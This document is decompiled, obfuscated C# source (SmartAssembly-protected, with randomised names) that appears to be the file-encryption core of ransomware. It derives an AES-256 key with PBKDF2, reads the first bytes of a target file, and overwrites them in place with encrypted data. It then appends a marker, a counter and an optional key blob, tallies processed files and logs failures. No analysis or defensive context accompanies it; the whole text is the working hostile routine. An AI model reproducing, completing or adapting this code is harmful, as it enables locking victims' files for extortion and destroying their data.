using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

public static class PsMAbAPGwNaiG
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] ddDsnuGdyRxS(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = FGDdCrSLxpR(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes FGDdCrSLxpR(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] jZLDTviUrm(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (ACJZwXMCdgNnIA.RrpEvBQBLONZKo == getString_0(107396983))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (ACJZwXMCdgNnIA.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(ACJZwXMCdgNnIA.bDDJFCkjBbYQ, getString_0(107398668) + string_0 + getString_0(107378874) + ex.Message + getString_0(107396750));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool teuDisObNXw(string TTIkAHWRYFFqFLX, byte[] ipZGIkDRDrXd, byte[] ecklbfBlPisB = null)
	{
		try
		{
			byte[] array = null;
			if (ACJZwXMCdgNnIA.RrpEvBQBLONZKo == getString_0(107396983))
			{
				array = (ACJZwXMCdgNnIA.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(ACJZwXMCdgNnIA.ueuvoVAMScuH) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378816)) + Convert.ToString(ACJZwXMCdgNnIA.bQealBkUmzhp) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378816))) : Encoding.ASCII.GetBytes(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(ACJZwXMCdgNnIA.ueuvoVAMScuH) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378793)) + Convert.ToString(ACJZwXMCdgNnIA.bQealBkUmzhp) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378793))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(TTIkAHWRYFFqFLX, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(ipZGIkDRDrXd, 0, ipZGIkDRDrXd.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(TTIkAHWRYFFqFLX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!ACJZwXMCdgNnIA.UpNccIaFzBadyA)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(ecklbfBlPisB, 0, ecklbfBlPisB.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (ACJZwXMCdgNnIA.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(ACJZwXMCdgNnIA.ueuvoVAMScuH) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378816)) + Convert.ToString(ACJZwXMCdgNnIA.bQealBkUmzhp) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378816))) : Encoding.ASCII.GetBytes(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(ACJZwXMCdgNnIA.ueuvoVAMScuH) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378793)) + Convert.ToString(ACJZwXMCdgNnIA.bQealBkUmzhp) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378793))));
				FileStream fileStream2 = new FileStream(TTIkAHWRYFFqFLX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(ipZGIkDRDrXd, 0, ipZGIkDRDrXd.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(TTIkAHWRYFFqFLX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!ACJZwXMCdgNnIA.UpNccIaFzBadyA)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(ecklbfBlPisB, 0, ecklbfBlPisB.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			ACJZwXMCdgNnIA.DPjjDEUnrYJ++;
		}
		catch (Exception ex)
		{
			if (ACJZwXMCdgNnIA.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(ACJZwXMCdgNnIA.bDDJFCkjBbYQ, getString_0(107398668) + TTIkAHWRYFFqFLX + getString_0(107378807) + ex.Message + getString_0(107396750));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (ACJZwXMCdgNnIA.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(ACJZwXMCdgNnIA.ueuvoVAMScuH) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378816)) + Convert.ToString(ACJZwXMCdgNnIA.bQealBkUmzhp) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378816))) : Encoding.ASCII.GetBytes(ACJZwXMCdgNnIA.UJcPFgFtVJhWf(ACJZwXMCdgNnIA.ueuvoVAMScuH) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378793)) + Convert.ToString(ACJZwXMCdgNnIA.bQealBkUmzhp) + ACJZwXMCdgNnIA.UJcPFgFtVJhWf(getString_0(107378793))));
				FileStream fileStream4 = new FileStream(TTIkAHWRYFFqFLX, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(ipZGIkDRDrXd, 0, ipZGIkDRDrXd.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(TTIkAHWRYFFqFLX, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!ACJZwXMCdgNnIA.UpNccIaFzBadyA)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(ecklbfBlPisB, 0, ecklbfBlPisB.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static PsMAbAPGwNaiG()
	{
		Strings.CreateGetStringDelegate(typeof(PsMAbAPGwNaiG));
	}
}
